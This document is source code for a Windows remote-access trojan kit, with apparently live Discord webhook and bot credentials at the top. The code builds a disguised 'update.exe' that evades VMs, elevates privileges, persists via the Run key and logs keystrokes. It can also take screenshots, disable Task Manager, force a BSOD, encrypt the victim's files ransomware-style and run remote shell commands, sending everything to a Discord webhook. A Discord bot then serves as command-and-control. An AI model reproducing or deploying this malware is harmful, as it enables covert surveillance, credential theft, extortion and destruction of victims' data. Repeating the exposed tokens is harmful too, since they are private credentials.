pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip discord.py

https://discord.com/api/webhooks/1453489886308073522/o9Bg9jBIWlj8nUGlYdMWHlLALtzIoIedkwtioTFgFPVX3SEo7WeolqoqEvZUbSA1W1JB

MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GSV3BK.YJhYzr25_Tef s0VAH5VMeZnEPCvJXyKZ5JlNVU

server id = 1264299849063333919

Channel id = 1264299849604661331

https://pastebin.com/raw/m5U6eger




import os
import subprocess
import shutil

webhook_url = input("Discord webhook URL: ").strip()
command_url = input("Pastebin raw URL (with {}): ").strip()
output_name = "update.exe"

rat_code = f'''
import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "{webhook_url}"
COMMAND_URL = "{command_url}"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = ""

def send(msg="", embed=None, file=None):
    if msg: msg = f"[{{VICTIM_ID}}] {{msg}}"
    if embed and "title" in embed: embed["title"] = f"[{{VICTIM_ID}}] {{embed['title']}}"
    data = {{"content": msg}}
    if embed: data["embeds"] = [embed]
    files = {{"file": file}} if file else None
    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except: pass

def info():
    try: ip = requests.get("https://api.ipify.org", timeout=5).text
    except: ip = "Unknown"
    embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**User:** {{getpass.getuser()}}\\n**PC:** {{socket.gethostname()}}\\n**IP:** {{ip}}", "color": 16711680}}
    send(embed=embed)

def anti_vm():
    try:
        if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
            sys.exit(0)
    except: pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except: pass

def on_press(key):
    global KEYLOG_BUFFER
    try: KEYLOG_BUFFER += key.char
    except: KEYLOG_BUFFER += f" [{{str(key)}}] "
    if len(KEYLOG_BUFFER) > 500:
        send(f"Keylog dump:\\n{{KEYLOG_BUFFER}}")
        KEYLOG_BUFFER = ""

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send("Screenshot", file=("ss.png", buf, "image/png"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send("Workstation locked")

def disable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        send("Task Manager disabled")
    except: pass

def enable_tm():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        send("Task Manager enabled")
    except: pass

def bsod():
    send("Triggering BSOD...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"ENCRYPTION KEY - SAVE IT: {{key.decode()}}")
    count = 0
    exts = (".docx",".pdf",".jpg",".png",".txt",".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp,"rb") as d: enc = f.encrypt(d.read())
                    with open(fp+".locked","wb") as o: o.write(enc)
                    os.remove(fp)
                    count += 1
                except: pass
    send(f"Encrypted {{count}} files")

def shell(cmd):
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e: out = str(e)
    send(f"Shell output:\\n{{out[:3000]}}")

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                if cmd in ["ss","screenshot"]: screenshot()
                elif cmd == "lock": lock_pc()
                elif cmd == "disabletm": disable_tm()
                elif cmd == "enabletm": enable_tm()
                elif cmd == "bsod": bsod()
                elif cmd == "encrypt": encrypt(arg or None)
                elif cmd == "shell": shell(arg)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    anti_vm()
    elevate()
    persist()
    info()
    threading.Thread(target=poll, daemon=True).start()
    with Listener(on_press=on_press) as l:
        l.join()
'''

with open("rat.py", "w") as f: f.write(rat_code)

print("Building bulletproof EXE...")
subprocess.run([
    "pyinstaller","--onefile","--noconsole",
    "--collect-all","pynput",
    "--hidden-import=pynput.keyboard._win32",
    "--hidden-import=pynput._util.win32",
    "--name",output_name,"rat.py"
])

shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove("rat.py") if os.path.exists("rat.py") else None
os.remove("rat.spec") if os.path.exists("rat.spec") else None

print(f"EXE ready: dist\\{output_name}")




import discord
from discord.ext import commands
import re
import json
import requests

TOKEN = "YOUR_BOT_TOKEN_HERE"
GUILD_ID = 123456789012345678      # Your server ID
PASTEBIN_RAW = "https://pastebin.com/raw/XXXXXXXX"  # Your fixed Pastebin raw URL with {}

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="-", intents=intents)  # Commands start with -

known_victims = set()

# Load current commands from Pastebin
def get_current_commands():
    try:
        return requests.get(PASTEBIN_RAW).json()
    except:
        return {}

# Save updated commands back to Pastebin
def update_commands(new_cmds):
    data = {
        "api_dev_key": "YOUR_PASTEBIN_DEV_KEY_HERE",  # Get from pastebin.com/api
        "api_option": "paste",
        "api_paste_code": json.dumps(new_cmds),
        "api_paste_private": "1",
        "api_paste_name": "rat_cmds",
        "api_paste_expire_date": "N"
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if "pastebin.com" in response.text:
        print("[+] Commands updated successfully")
    else:
        print("[-] Pastebin update failed")

async def create_victim_section(victim_id):
    guild = bot.get_guild(GUILD_ID)
    if not guild: return None
    
    category_name = f"Victim-{victim_id}"
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
    
    channel_name = f"logs-{victim_id}"
    channel = discord.utils.get(category.text_channels, name=channel_name)
    if not channel:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        channel = await category.create_text_channel(channel_name, overwrites=overwrites)
    
    return channel

@bot.event
async def on_ready():
    print(f"[+] {bot.user} online - full command control activated")

@bot.event
async def on_message(message):
    if message.author.bot: return
    if not message.channel.category or not message.channel.category.name.startswith("Victim-"): 
        await bot.process_commands(message)
        return
    
    # Extract victim ID from channel name (logs-abc12345)
    match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
    if not match: return
    victim_id = match.group(1)
    
    # Process commands only in victim channels
    if message.content.startswith("-"):
        cmd = message.content[1:].strip().split(" ", 1)
        command = cmd[0].lower()
        arg = cmd[1] if len(cmd) > 1 else ""
        
        current = get_current_commands()
        current[victim_id] = command + (" " + arg if arg else "")
        
        update_commands(current)
        await message.reply(f"Queued **{command}** for victim **{victim_id}** → Executing now...")
    
    await bot.process_commands(message)

# Optional: Add a global command in any channel (e.g., !status)
@bot.command()
async def status(ctx):
    await ctx.send(f"Bot alive | {len(known_victims)} victims online")

bot.run(TOKEN)
